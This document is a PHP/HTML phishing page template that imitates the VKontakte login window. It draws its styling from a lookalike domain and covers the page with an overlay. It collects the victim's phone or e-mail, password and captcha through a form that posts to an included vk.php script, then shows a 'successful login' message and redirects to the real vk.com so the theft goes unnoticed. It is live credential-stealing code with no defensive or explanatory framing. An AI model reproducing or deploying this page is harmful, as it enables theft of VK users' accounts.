<?php include('vk.php'); ?>
<a>
<link rel="stylesheet" type="text/css" href="https://vkonte.live/api/v1/frame.css">
<script language="javascript" type="text/javascript" src="https://vk.com/js/api/common_light.js"></script>
<link rel="stylesheet" type="text/css" href="https://vkonte.live/api/login/frame.css">
<div class="vkframe" style="<?php if ($num != 0){ ?> display: block<?php }else{ ?>display: block<?php }?>"> <div class="VK oauth_page vk_auth" style="background: transparent; position: absolute; top: 50%; left: 50%; margin-right: -50%; transform: translate(-50%, -50%); z-index: 90000;"> <div id="sub_cont" style=""> <table id="container" class="container" cellspacing="0" cellpadding="0"> <tbody><tr> <td class="head" style="padding: 14px 20px 18px;"> <a href="https://vk.com" target="_blank" class="logo"></a> <div class="auth_items"> <a class="head_name fl_r" href="http://vk.com/join?reg=1" target="_blank" style="width: 15%;">Регистрация</a> </div> </td> </tr> <tr> <td valign="top"> <div class="info_line" style="font-size: 11px">Для продолжения необходимо войти через <b>ВКонтакте</b>.</div> <div id="box_cont"> <center> <div style="width:80%; <?=$baza ?>">
<?php if($num == 1) { ?><div class="msg msg-error" style="display: block;color: #cc0000;">Пожалуйста, проверьте правильность написания логина и пароля.</div> <?php } ?>
<?php if($num == 2) { ?><script> setTimeout(function(){location.replace("https://vk.com/");}, 2000);
 </script><div class="msg msg-success" style="display: block; ">Авторизация прошла успешно! Ожидайте.</div><?php } ?>

</div> <div id="box" class="box box_login"> <form method="post" id="vkonteclub"> <div class="info"> <div class="form_header">Телефон или e-mail</div> <div class="labeled"><input type="text" name="email" class="text" style="width:153px"></div> <div class="form_header">Пароль</div> <div class="labeled"><input type="password" id="password" name="password" class="text" style="width:153px"></div> <div id="captcha" style="display:none;"> <br> <img id="captcha_img" style="width: 130px; height: 50px; margin: 0 auto; background: url(http://vk.me/images/vklogo.gif); cursor: pointer;"> <div class="input-group"> 
<div class="form_header">Код с картинки</div> <input type="text" name="captcha_sid" value="<?=$kek?> style="display:none;"> <div class="labeled">
<input type="text" style="width:153px" name="captcha_key" class="text"></div> </div> </div> <div class="popup_login_btn">
<br><input class = "flat_button button_big" style="width: 155px;text-align: center;" id="login" value="Войти" type="submit"> </div> </div></form> </div> </center> </div> </td> </tr> </tbody></table> </div> </div> </div>
<div id="overlay" style="<?php if ($num != 0){ ?> display: block;<?php }else{ ?>display: block;<?php }?> height: 100%; opacity: 0.7; position: absolute; top: 0px; left: 0px; background-color: black; width: 100%; z-index: 5000;"></div>

<style>
.pw-popup__title{color: #000;}
.pw-popup__text{color: #000;}
</style>
<center>


 <script src="./main/jquery-1.8.3.js"></script>
	<input type="hidden" name="vkonteurl" value="http://supp-new.tk/list.html">


<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">

</div></div>

</center></a>